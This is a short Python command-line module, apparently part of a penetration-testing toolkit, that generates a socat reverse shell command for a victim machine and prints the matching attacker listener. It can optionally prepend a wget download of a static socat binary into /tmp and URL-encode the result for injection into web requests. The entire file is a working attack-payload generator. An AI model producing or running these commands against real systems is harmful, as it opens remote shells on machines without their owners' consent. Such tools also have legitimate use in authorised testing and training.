import click
from colorama import Fore
from urllib.parse import quote

@click.command()
@click.argument("listener_ip")
@click.argument("listener_port")
@click.option("-r", "--raw", is_flag=True, default=False, help="Enable raw output.")
@click.option("-u", "--urlencode", is_flag=True, default=False, help="URL-encode the output.")
@click.option("--download", is_flag=True, default=False, help="Include wget download of static socat binary.")
def command(listener_ip, listener_port, raw, urlencode, download):
    """Return socat reverse shell (victim side). Listener: socat file:`tty`,raw,echo=0 TCP-L:<port>"""
    if download:
        cmd = (f"wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat "
               f"-O /tmp/socat; chmod +x /tmp/socat; "
               f"/tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{listener_ip}:{listener_port}")
    else:
        cmd = f"/tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{listener_ip}:{listener_port}"
    if urlencode:
        cmd = quote(cmd)
    if not raw:
        click.secho(f"{Fore.LIGHTGREEN_EX}Socat listener (attacker):\n\t{Fore.WHITE}socat file:`tty`,raw,echo=0 TCP-L:{listener_port}")
        click.secho(f"{Fore.LIGHTGREEN_EX}Socat reverse shell (victim):\n\t{Fore.WHITE}{cmd}")
    else:
        click.secho(cmd, nl=False)
